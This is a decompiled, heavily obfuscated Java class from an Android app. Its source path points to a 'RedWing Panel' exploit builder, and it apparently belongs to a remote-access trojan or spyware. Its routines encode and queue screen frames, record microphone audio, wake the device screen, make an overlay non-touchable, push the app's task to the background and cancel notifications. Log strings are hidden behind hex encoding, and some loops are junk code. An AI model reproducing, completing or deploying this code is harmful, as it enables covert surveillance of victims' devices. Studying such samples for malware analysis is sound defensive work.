package v.s;

import android.app.NotificationManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.media.AudioRecord;
import android.media.MediaCodec;
import android.os.PowerManager;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.ScrollView;
import androidx.activity.ComponentActivity;
import androidx.work.CoroutineWorker;
import androidx.work.WorkerParameters;
import androidx.work.impl.workers.ConstraintTrackingWorker;
import app.mobilex.plus.ChatActivity;
import app.mobilex.plus.UtilNRBridge;
import app.mobilex.plus.UtilNWWrapper;
import app.mobilex.plus.services.CacheLUJob;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.services.HelperHRAdapter$registerScreenStateReceiver$1;
import app.mobilex.plus.util.TypefaceCache;
import java.nio.ByteBuffer;
import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.Iterator;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class hzCVl0f866ksvpzUUql implements Runnable {
    public final /* synthetic */ Object vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ hzCVl0f866ksvpzUUql(int i, Object obj) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = obj;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r12v10 */
    /* JADX WARN: Type inference failed for: r12v3 */
    /* JADX WARN: Type inference failed for: r12v4 */
    /* JADX WARN: Type inference failed for: r13v3 */
    /* JADX WARN: Type inference failed for: r13v4 */
    /* JADX WARN: Type inference failed for: r13v6 */
    /* JADX WARN: Type inference failed for: r14v3 */
    /* JADX WARN: Type inference failed for: r14v4 */
    /* JADX WARN: Type inference failed for: r14v9 */
    /* JADX WARN: Type inference failed for: r15v4 */
    /* JADX WARN: Type inference failed for: r15v5 */
    /* JADX WARN: Type inference failed for: r15v7 */
    /* JADX WARN: Type inference failed for: r5v10, types: [android.view.ViewManager, android.view.WindowManager] */
    @Override // java.lang.Runnable
    public final void run() {
        long j = 0;
        int i = 1;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp = (x1G2i7KvSdxo3fp) this.vekpFI4d1Nc4fakF;
                ConcurrentLinkedQueue concurrentLinkedQueue = x1g2i7kvsdxo3fp.D5P1xCAyuvgF;
                AtomicBoolean atomicBoolean = x1g2i7kvsdxo3fp.pyu8ovAipBTLYAiKab;
                MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo();
                MediaCodec mediaCodec = x1g2i7kvsdxo3fp.Ee8d2j4S9Vm5yGuR;
                if (mediaCodec == null) {
                    return;
                }
                while (atomicBoolean.get()) {
                    try {
                        int iDequeueOutputBuffer = mediaCodec.dequeueOutputBuffer(bufferInfo, 10000L);
                        if (iDequeueOutputBuffer < 0) {
                            continue;
                        } else {
                            ByteBuffer outputBuffer = mediaCodec.getOutputBuffer(iDequeueOutputBuffer);
                            if (outputBuffer != null && bufferInfo.size > 0) {
                                ?? r14 = (bufferInfo.flags & 2) != 0;
                                while (System.nanoTime() < j) {
                                    StringBuilder sb = new StringBuilder();
                                    sb.append(0);
                                    sb.setLength(0);
                                }
                                byte b = r14 == true ? (byte) 1 : ((bufferInfo.flags & 1) != 0) != false ? (byte) 2 : (byte) 3;
                                int i2 = bufferInfo.size;
                                byte[] bArr = new byte[i2];
                                outputBuffer.position(bufferInfo.offset);
                                outputBuffer.get(bArr, 0, bufferInfo.size);
                                byte[] bArr2 = new byte[i2 + 1];
                                bArr2[0] = b;
                                System.arraycopy(bArr, 0, bArr2, 1, i2);
                                if (concurrentLinkedQueue.size() < 8) {
                                    concurrentLinkedQueue.offer(bArr2);
                                } else {
                                    x1g2i7kvsdxo3fp.hjneShqpF9Tis4.incrementAndGet();
                                }
                            }
                            mediaCodec.releaseOutputBuffer(iDequeueOutputBuffer, false);
                            if ((bufferInfo.flags & 4) != 0) {
                                TypefaceCache.obtain("000600590068");
                                return;
                            }
                            j = 0;
                        }
                    } catch (InterruptedException unused) {
                        return;
                    } catch (Exception e) {
                        if (atomicBoolean.get()) {
                            TypefaceCache.obtain("00070064005A008E00FE00E50092");
                            e.getMessage();
                        }
                    }
                }
                return;
            case 1:
                CacheLUJob cacheLUJob = (CacheLUJob) this.vekpFI4d1Nc4fakF;
                String str = CacheLUJob.Ee8d2j4S9Vm5yGuR;
                cacheLUJob.w9sT1Swbhx3hs();
                return;
            case 2:
                ScrollView scrollView = ((ChatActivity) this.vekpFI4d1Nc4fakF).w9sT1Swbhx3hs;
                if (scrollView != null) {
                    scrollView.fullScroll(130);
                    return;
                }
                return;
            case 3:
                String str2 = (String) this.vekpFI4d1Nc4fakF;
                String str3 = ChatActivity.Ee8d2j4S9Vm5yGuR;
                ChatActivity chatActivity = ChatActivity.ibVTtJUNfrGYbW;
                if (chatActivity != null) {
                    chatActivity.dDIMxZXP1V8HdM(str2, false);
                    return;
                }
                return;
            case 4:
                ((ComponentActivity) this.vekpFI4d1Nc4fakF).invalidateOptionsMenu();
                return;
            case 5:
                WKsCRCZJmHvmMVmS26jN wKsCRCZJmHvmMVmS26jN = (WKsCRCZJmHvmMVmS26jN) this.vekpFI4d1Nc4fakF;
                Runnable runnable = wKsCRCZJmHvmMVmS26jN.vekpFI4d1Nc4fakF;
                if (runnable != null) {
                    runnable.run();
                    wKsCRCZJmHvmMVmS26jN.vekpFI4d1Nc4fakF = null;
                    return;
                }
                return;
            case 6:
                ConstraintTrackingWorker constraintTrackingWorker = (ConstraintTrackingWorker) this.vekpFI4d1Nc4fakF;
                if (constraintTrackingWorker.b1EoSIRjJHO5.w9sT1Swbhx3hs instanceof ibVTtJUNfrGYbW) {
                    return;
                }
                Object obj = constraintTrackingWorker.w9sT1Swbhx3hs.w9sT1Swbhx3hs.dDIMxZXP1V8HdM.get("androidx.work.impl.workers.ConstraintTrackingWorker.ARGUMENT_CLASS_NAME");
                String str4 = obj instanceof String ? (String) obj : null;
                fEyMFFyOOvHURJ7To6L.pyu8ovAipBTLYAiKab();
                if (str4 == null || str4.length() == 0) {
                    int i3 = X4MUXskPk6V6I.dDIMxZXP1V8HdM;
                    constraintTrackingWorker.b1EoSIRjJHO5.pyu8ovAipBTLYAiKab(new zNadm2dnLHIyNeibE5());
                    return;
                }
                CnoOvV7IQM0UcSfbVg cnoOvV7IQM0UcSfbVg = constraintTrackingWorker.w9sT1Swbhx3hs.xDyLpEZyrcKVe0;
                Context context = constraintTrackingWorker.dDIMxZXP1V8HdM;
                WorkerParameters workerParameters = constraintTrackingWorker.Ee8d2j4S9Vm5yGuR;
                cnoOvV7IQM0UcSfbVg.getClass();
                Qa4pJoqqkp7u qa4pJoqqkp7uDDIMxZXP1V8HdM = CnoOvV7IQM0UcSfbVg.dDIMxZXP1V8HdM(context, str4, workerParameters);
                constraintTrackingWorker.pyu8ovAipBTLYAiKab = qa4pJoqqkp7uDDIMxZXP1V8HdM;
                if (qa4pJoqqkp7uDDIMxZXP1V8HdM == null) {
                    int i4 = X4MUXskPk6V6I.dDIMxZXP1V8HdM;
                    constraintTrackingWorker.b1EoSIRjJHO5.pyu8ovAipBTLYAiKab(new zNadm2dnLHIyNeibE5());
                    return;
                }
                bIQtXpTQsEoGIf25Z biqtxptqseogif25zL1V0lQr6TbwNKqHfXNbb = bIQtXpTQsEoGIf25Z.l1V0lQr6TbwNKqHfXNbb(constraintTrackingWorker.dDIMxZXP1V8HdM);
                sFdNPiaH9eT4T sfdnpiah9et4tGmNWMfvn6zlEj = biqtxptqseogif25zL1V0lQr6TbwNKqHfXNbb.b1EoSIRjJHO5.XiR1pIn5878vVWd().gmNWMfvn6zlEj(constraintTrackingWorker.w9sT1Swbhx3hs.dDIMxZXP1V8HdM.toString());
                if (sfdnpiah9et4tGmNWMfvn6zlEj == null) {
                    Af6wX3D8R2iFhqxr af6wX3D8R2iFhqxr = constraintTrackingWorker.b1EoSIRjJHO5;
                    int i5 = X4MUXskPk6V6I.dDIMxZXP1V8HdM;
                    af6wX3D8R2iFhqxr.pyu8ovAipBTLYAiKab(new zNadm2dnLHIyNeibE5());
                    return;
                }
                r5XEUfod5GSCCwq6c r5xeufod5gsccwq6c = new r5XEUfod5GSCCwq6c(biqtxptqseogif25zL1V0lQr6TbwNKqHfXNbb.Qrz92kRPw4GcghAc);
                constraintTrackingWorker.b1EoSIRjJHO5.dDIMxZXP1V8HdM(new hzCVl0f866ksvpzUUql(7, hYpmJoivns3nhcS6.dDIMxZXP1V8HdM(r5xeufod5gsccwq6c, sfdnpiah9et4tGmNWMfvn6zlEj, (rPTA1zWZR3GTVlGPw) biqtxptqseogif25zL1V0lQr6TbwNKqHfXNbb.pyu8ovAipBTLYAiKab.w9sT1Swbhx3hs, constraintTrackingWorker)), new S7iZMVp9ciczvGPfF(2));
                if (!r5xeufod5gsccwq6c.JXn4Qf7zpnLjP5(sfdnpiah9et4tGmNWMfvn6zlEj)) {
                    int i6 = X4MUXskPk6V6I.dDIMxZXP1V8HdM;
                    constraintTrackingWorker.b1EoSIRjJHO5.pyu8ovAipBTLYAiKab(new di1l5OJ60eKNOgQR8yCS());
                    return;
                }
                int i7 = X4MUXskPk6V6I.dDIMxZXP1V8HdM;
                try {
                    Af6wX3D8R2iFhqxr af6wX3D8R2iFhqxrJXn4Qf7zpnLjP5 = constraintTrackingWorker.pyu8ovAipBTLYAiKab.JXn4Qf7zpnLjP5();
                    af6wX3D8R2iFhqxrJXn4Qf7zpnLjP5.dDIMxZXP1V8HdM(new A68NpXPqwTFos99nt(constraintTrackingWorker, 5, af6wX3D8R2iFhqxrJXn4Qf7zpnLjP5), constraintTrackingWorker.w9sT1Swbhx3hs.JXn4Qf7zpnLjP5);
                    return;
                } catch (Throwable unused2) {
                    int i8 = X4MUXskPk6V6I.dDIMxZXP1V8HdM;
                    synchronized (constraintTrackingWorker.xDyLpEZyrcKVe0) {
                        try {
                            if (constraintTrackingWorker.ibVTtJUNfrGYbW) {
                                constraintTrackingWorker.b1EoSIRjJHO5.pyu8ovAipBTLYAiKab(new di1l5OJ60eKNOgQR8yCS());
                                return;
                            } else {
                                constraintTrackingWorker.b1EoSIRjJHO5.pyu8ovAipBTLYAiKab(new zNadm2dnLHIyNeibE5());
                                return;
                            }
                        } catch (Throwable th) {
                            throw th;
                        }
                    }
                }
            case 7:
                ((z17cwwEfkgV0Mm5Z) this.vekpFI4d1Nc4fakF).vekpFI4d1Nc4fakF(null);
                return;
            case 8:
                CoroutineWorker coroutineWorker = (CoroutineWorker) this.vekpFI4d1Nc4fakF;
                if (coroutineWorker.xDyLpEZyrcKVe0.w9sT1Swbhx3hs instanceof ibVTtJUNfrGYbW) {
                    coroutineWorker.Ee8d2j4S9Vm5yGuR.vekpFI4d1Nc4fakF(null);
                    return;
                }
                return;
            case 9:
                DataQFAdapter.safePostDelayed$lambda$2((JRdueaGIH5g8DVCPba) this.vekpFI4d1Nc4fakF);
                return;
            case 10:
                Context context2 = (Context) this.vekpFI4d1Nc4fakF;
                int i9 = HelperHRAdapter$registerScreenStateReceiver$1.w9sT1Swbhx3hs;
                if (((PowerManager) context2.getSystemService("power")).isInteractive()) {
                    return;
                }
                DataQFAdapter.Companion.getClass();
                DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
                if (dataQFAdapter != null) {
                    dataQFAdapter.performWakeScreen();
                    return;
                }
                return;
            case 11:
                lLybWDNhgEj7LwIe llybwdnhgej7lwie = (lLybWDNhgEj7LwIe) this.vekpFI4d1Nc4fakF;
                ConcurrentLinkedQueue concurrentLinkedQueue2 = llybwdnhgej7lwie.Ee8d2j4S9Vm5yGuR;
                AtomicBoolean atomicBoolean2 = llybwdnhgej7lwie.vekpFI4d1Nc4fakF;
                MediaCodec.BufferInfo bufferInfo2 = new MediaCodec.BufferInfo();
                while (System.nanoTime() < 0) {
                    Runtime.getRuntime().totalMemory();
                }
                MediaCodec mediaCodec2 = llybwdnhgej7lwie.dDIMxZXP1V8HdM;
                if (mediaCodec2 == null) {
                    return;
                }
                while (atomicBoolean2.get()) {
                    try {
                        int iDequeueOutputBuffer2 = mediaCodec2.dequeueOutputBuffer(bufferInfo2, 33000L);
                        if (iDequeueOutputBuffer2 < 0) {
                            continue;
                        } else {
                            ByteBuffer outputBuffer2 = mediaCodec2.getOutputBuffer(iDequeueOutputBuffer2);
                            if (outputBuffer2 == null) {
                                mediaCodec2.releaseOutputBuffer(iDequeueOutputBuffer2, false);
                            } else {
                                int i10 = bufferInfo2.size;
                                if (i10 > 0) {
                                    int i11 = bufferInfo2.flags;
                                    byte b2 = ((i11 & 2) != 0) == true ? (byte) 1 : ((i11 & 1) != 0) != false ? (byte) 2 : (byte) 3;
                                    byte[] bArr3 = new byte[i10];
                                    outputBuffer2.position(bufferInfo2.offset);
                                    outputBuffer2.get(bArr3, 0, bufferInfo2.size);
                                    byte[] bArr4 = new byte[i10 + 1];
                                    bArr4[0] = b2;
                                    System.arraycopy(bArr3, 0, bArr4, 1, i10);
                                    if (concurrentLinkedQueue2.size() < 10) {
                                        concurrentLinkedQueue2.offer(bArr4);
                                    }
                                }
                                mediaCodec2.releaseOutputBuffer(iDequeueOutputBuffer2, false);
                                if ((bufferInfo2.flags & 4) != 0) {
                                    TypefaceCache.obtain("00060059006800C700F600AD00DD00AA006300730055008400FF00BB00D700B5");
                                    TypefaceCache.obtain("00070064005A008E00FE00FF00DE00A8002C0066001B008200E800B600C600A20027");
                                    return;
                                }
                                continue;
                            }
                        }
                    } catch (InterruptedException unused3) {
                    } catch (Exception e2) {
                        if (atomicBoolean2.get()) {
                            TypefaceCache.obtain("00070064005A008E00FE00FF00D700B500310079004900DD00B0");
                            e2.getMessage();
                        }
                    }
                }
                TypefaceCache.obtain("00070064005A008E00FE00FF00DE00A8002C0066001B008200E800B600C600A20027");
                return;
            case 12:
                iniVyKd0OGb2raI4 inivykd0ogb2rai4 = (iniVyKd0OGb2raI4) this.vekpFI4d1Nc4fakF;
                synchronized (((ArrayDeque) inivykd0ogb2rai4.xDyLpEZyrcKVe0)) {
                    SharedPreferences.Editor editorEdit = ((SharedPreferences) inivykd0ogb2rai4.vekpFI4d1Nc4fakF).edit();
                    String str5 = (String) inivykd0ogb2rai4.JXn4Qf7zpnLjP5;
                    StringBuilder sb2 = new StringBuilder();
                    Iterator it = ((ArrayDeque) inivykd0ogb2rai4.xDyLpEZyrcKVe0).iterator();
                    while (it.hasNext()) {
                        sb2.append((String) it.next());
                        sb2.append((String) inivykd0ogb2rai4.Ee8d2j4S9Vm5yGuR);
                    }
                    editorEdit.putString(str5, sb2.toString()).commit();
                    break;
                }
                return;
            case 13:
                PHZNFNJs3M6qql pHZNFNJs3M6qql = (PHZNFNJs3M6qql) this.vekpFI4d1Nc4fakF;
                short[] sArr = new short[1600];
                while (pHZNFNJs3M6qql.xDyLpEZyrcKVe0) {
                    try {
                        AudioRecord audioRecord = pHZNFNJs3M6qql.vekpFI4d1Nc4fakF;
                        int i12 = audioRecord != null ? audioRecord.read(sArr, 0, 1600) : -1;
                        if (i12 > 0 && pHZNFNJs3M6qql.xDyLpEZyrcKVe0) {
                            pHZNFNJs3M6qql.ibVTtJUNfrGYbW.offer(Arrays.copyOf(sArr, i12));
                        } else if (i12 < 0) {
                            return;
                        }
                    } catch (Exception e3) {
                        TypefaceCache.obtain("0010006F004800C700E200BA00D300A300260064001B008200E200AD00DD00B500790036");
                        e3.getMessage();
                        return;
                    }
                }
                return;
            case 14:
                UtilNRBridge utilNRBridge = (UtilNRBridge) this.vekpFI4d1Nc4fakF;
                int i13 = UtilNRBridge.dDIMxZXP1V8HdM;
                try {
                    utilNRBridge.moveTaskToBack(true);
                    break;
                } catch (Exception unused4) {
                }
                utilNRBridge.finish();
                return;
            case 15:
                NotificationManager notificationManager = (NotificationManager) this.vekpFI4d1Nc4fakF;
                String str6 = UtilNWWrapper.A1BaTVAMeIXMnh;
                try {
                    notificationManager.cancel(7777);
                    return;
                } catch (Exception unused5) {
                    return;
                }
            case 16:
                AuGYnq4dE8pY auGYnq4dE8pY = (AuGYnq4dE8pY) this.vekpFI4d1Nc4fakF;
                DataQFAdapter.Companion.getClass();
                DataQFAdapter dataQFAdapter2 = DataQFAdapter.instance;
                if (dataQFAdapter2 == null) {
                    auGYnq4dE8pY.pyu8ovAipBTLYAiKab(XjSHuXm0nOSRc3iA9.D5P1xCAyuvgF);
                    return;
                }
                ViewGroup viewGroup = vbdyByOHPJmeGXlq.wotphlvK9sPbXJ;
                boolean z = vbdyByOHPJmeGXlq.b1EoSIRjJHO5;
                if (z && viewGroup != null) {
                    try {
                        ?? r5 = (WindowManager) dataQFAdapter2.getSystemService("window");
                        ViewGroup.LayoutParams layoutParams = viewGroup.getLayoutParams();
                        WindowManager.LayoutParams layoutParams2 = layoutParams instanceof WindowManager.LayoutParams ? (WindowManager.LayoutParams) layoutParams : null;
                        if (layoutParams2 != null) {
                            layoutParams2.flags |= 16;
                            r5.updateViewLayout(viewGroup, layoutParams2);
                        }
                    } catch (Exception e4) {
                        TypefaceCache.obtain("001300770048009400E400B700C000A800360071005300C700F600B300D300A000630077005F008300B000BA00C000B5002C0064000100C7");
                        e4.getMessage();
                    }
                    break;
                }
                vbdyByOHPJmeGXlq.Qrz92kRPw4GcghAc.postDelayed(new ePkLbnAmfpx0dtD(i, auGYnq4dE8pY, dataQFAdapter2, z), 50L);
                return;
            case 17:
                ((EditText) this.vekpFI4d1Nc4fakF).requestFocus();
                return;
            case 18:
                gORGwV1UC2rtv3txmCK gorgwv1uc2rtv3txmck = (gORGwV1UC2rtv3txmCK) this.vekpFI4d1Nc4fakF;
                gorgwv1uc2rtv3txmck.dDIMxZXP1V8HdM.getAction();
                gorgwv1uc2rtv3txmck.w9sT1Swbhx3hs.vekpFI4d1Nc4fakF(null);
                return;
            default:
                fUH025aw0Rgl fuh025aw0rgl = (fUH025aw0Rgl) this.vekpFI4d1Nc4fakF;
                ((c0GsmbUiugE231HPbX) ((WwqoyKhrbNp5qcng0CM) fuh025aw0rgl.JXn4Qf7zpnLjP5)).DVTNwpDEVsUKuznof(new rA0nQJPukyMi((-62) + 74, fuh025aw0rgl));
                return;
        }
    }
}
